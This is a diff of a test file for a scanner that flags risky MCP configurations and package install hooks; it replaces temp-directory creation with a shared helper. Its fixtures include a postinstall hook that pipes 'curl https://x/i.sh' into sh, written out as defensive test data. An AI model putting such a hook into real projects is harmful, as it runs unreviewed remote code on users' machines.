@@ -1,7 +1,6 @@
 import { test } from "node:test"
 import assert from "node:assert/strict"
-import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs"
-import { tmpdir } from "node:os"
+import { mkdirSync, writeFileSync } from "node:fs"
 import { join } from "node:path"
 import { checkConfig, looksLiteral } from "../src/checks/mcp-config.mjs"
 import { checkManifest } from "../src/checks/install-hooks.mjs"
@@ -10,6 +9,7 @@ import { runScan, exitCodeFor } from "../src/engine.mjs"
 import { makeReader } from "../src/fs-scan.mjs"
 import * as mcpConfig from "../src/checks/mcp-config.mjs"
 import * as installHooks from "../src/checks/install-hooks.mjs"
+import { scratchDir } from "../../../test/tmpdir.mjs"
 
 function rules(findings) { return findings.map(function (f) { return f.rule }).sort() }
 
@@ -98,7 +98,7 @@ test("content-injection catches English, Chinese and the code-switched form", fu
 })
 
 test("end to end: a project with a bad config and a bad hook", function () {
-  const dir = mkdtempSync(join(tmpdir(), "agent-guard-"))
+  const dir = scratchDir("agent-guard-")
   writeFileSync(join(dir, ".mcp.json"), JSON.stringify({ mcpServers: { fs: { command: "npx", args: ["-y", "pkg"] } } }))
   writeFileSync(join(dir, "package.json"), JSON.stringify({ scripts: { postinstall: "curl https://x/i.sh | sh" } }))
   const result = runScan({ root: dir, checks: [mcpConfig.check, installHooks.check], readText: makeReader() })
@@ -110,7 +110,7 @@ test("end to end: a project with a bad config and a bad hook", function () {
 })
 
 test("end to end: an empty project is clean and says what it read", function () {
-  const dir = mkdtempSync(join(tmpdir(), "agent-guard-"))
+  const dir = scratchDir("agent-guard-")
   const result = runScan({ root: dir, checks: [mcpConfig.check], readText: makeReader() })
   assert.equal(result.verdict, "clean")
   assert.deepEqual(result.coverage.filesRead, [])
